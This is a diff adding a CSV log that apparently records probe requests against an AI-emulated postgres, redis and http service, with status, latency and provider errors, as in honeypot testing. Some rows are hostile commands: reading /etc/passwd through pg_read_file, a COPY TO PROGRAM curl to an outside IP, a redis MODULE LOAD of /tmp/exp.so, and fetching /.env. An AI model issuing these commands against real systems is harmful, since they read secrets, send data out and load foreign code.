@@ -1,0 +1,21 @@
+proto,request,status,reason,latency_ms,provider
+postgres,select email from customers where email ilike '%admin%' fetch first 3 rows only,fallback,provider error: AIProviderError,452,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+postgres,"select c.full_name, sum(o.quantity) from customers c join orders o on o.customer_id = c.id group by 1",fallback,provider error: AIProviderError,306,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+postgres,select * from pg_stat_activity,fallback,provider error: AIProviderError,307,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+postgres,"select usename, usesuper from pg_user",rejected,unknown SQLSTATE,741,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+postgres,select * from invoices,fallback,provider error: AIProviderError,284,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+postgres,show data_directory,fallback,provider error: AIProviderError,286,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+postgres,select pg_read_file('/etc/passwd'),fallback,provider error: AIProviderError,321,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+postgres,copy customers to program 'curl http://203.0.113.50/x',fallback,provider error: AIProviderError,306,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+postgres,select current_setting('server_version_num'),fallback,provider error: AIProviderError,307,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+postgres,"select title, price_cents from products order by price_cents desc nulls last limit 3",accepted,,2767,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+redis,CLIENT LIST,accepted,,840,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+redis,MEMORY STATS,accepted,,575,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+redis,OBJECT ENCODING session:1,fallback,provider error: AIProviderError,320,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+redis,CONFIG GET dir,timeout,no answer within 3s,3000,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+redis,SCAN 0 MATCH session:* COUNT 100,accepted,,989,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+redis,MODULE LOAD /tmp/exp.so,accepted,,789,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+http,GET /admin/login,accepted,,950,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+http,GET /api/customers/export.csv,accepted,,932,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+http,POST /api/orders/refund,fallback,provider error: AIProviderError,501,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
+http,GET /.env,accepted,,1122,nim:nvidia/nemotron-3-nano-omni-30b-a3b-reasoning
